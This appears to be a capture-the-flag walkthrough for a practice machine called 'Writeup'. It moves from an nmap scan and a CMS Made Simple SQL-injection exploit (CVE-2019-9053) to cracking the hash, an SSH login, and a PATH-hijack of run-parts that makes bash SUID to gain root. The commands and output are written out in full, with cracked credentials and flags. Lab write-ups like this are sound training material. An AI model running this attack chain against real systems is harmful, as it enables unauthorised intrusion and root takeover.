![Writeup.PNG](/assets/Machines/Easy/Writeup/Writeup.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.138
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.138
```

**Output**
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

3. Visit Web Page

![web.PNG](/assets/Machines/Easy/Writeup/web.PNG)

4. If you try to do `directory fuzzing` you can't. For this reason try to visit manually most common files or directories. 

* **If page take too long time to response close web browser and try again.**

  * **URL:** `http://10.10.10.138/robots.txt`

![robots.PNG](/assets/Machines/Easy/Writeup/robots.PNG)

5. Visit previous leak directory

![dir.PNG](/assets/Machines/Easy/Writeup/dir.PNG)

6. You can use `whatweb` or `Wappalyzer` to know more of the webpage.
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Writeup]
└─# whatweb http://10.10.10.138/writeup 
```
**Output**
```
http://10.10.10.138/writeup [301 Moved Permanently] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.138], RedirectLocation[http://10.10.10.138/writeup/], Title[301 Moved Permanently]
http://10.10.10.138/writeup/ [200 OK] Apache[2.4.25], CMS-Made-Simple, Cookies[CMSSESSID9d372ef93962], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[10.10.10.138], MetaGenerator[CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.], Title[Home - writeup]
```

* This web page is made with **CMD Made Simple**


6. If you search for any exploit for **CMD Made Simple** you find this [CVE-2019-9053](https://www.exploit-db.com/exploits/46635)

7. Execute exploit.
* If you have problems, delete modules with conflits and try to migrate all code to **python3**
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Writeup]
└─# python 46635.py -u http://10.10.10.138/writeup/
```
**Output**
```
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

8. Crack hash with hashcat
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Writeup]
└─# hashcat -m 20 -a 0 hash /home/kali/Desktop/rockyou.txt
```
**Output**
```
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
```

9. Try to login with this credentials in ssh
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Writeup]
└─# ssh jkr@10.10.10.138 
jkr@10.10.10.138's password:
```

10. Show user flag
```
jkr@writeup:~$ cat user.txt 
1bc81e142ecdee1c2866e1a2d39a10c2
```


---
---
### **Privileges Escalation** 💀
1. Download pspy in target machine

* Our Machine
```
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Writeup]
└─# ls
46635.py  hash  password.txt  ports  Ports  pspy64  versions

┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Writeup]
└─# python -m http.server 80
```


* Target Machine
```
jkr@writeup:/tmp/Scan$ wget 10.10.14.33/pspy64
```


2. Put execute permissions on pspy64 and run it.
3. When you login with ssh this process run

```
2023/02/04 17:53:58 CMD: UID=0    PID=2157   | run-parts --lsbsysinit /etc/update-motd.d
```

* We stay in `staff group`, is meaning, we can write into `/usr/local/bin`.
* The $PATH in target machine is `/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games`

4. We can do `Path Hijaking`.
```
jkr@writeup:/tmp/Scan$ echo "chmod u+s /bin/bash" > /usr/local/bin/run-parts && chmod +x /usr/local/bin/run-parts
```

5. Login in ssh in other terminal.

![other.PNG](/assets/Machines/Easy/Writeup/other.PNG)

6. `/bin/bash` already have a SUID permission.
```
jkr@writeup:/tmp/Scan$ ls -ls /bin/bash
1076 -rwsr-xr-x 1 root root 1099016 May 15  2017 /bin/bash
```

7. Spawn a bash how **root** and show **root flag**
```
jkr@writeup:/tmp/Scan$ bash -p
bash-4.4# whoami
root
```
```
bash-4.4# cat /root/root.txt 
58165f666f00c678e49e888d882f68c6
```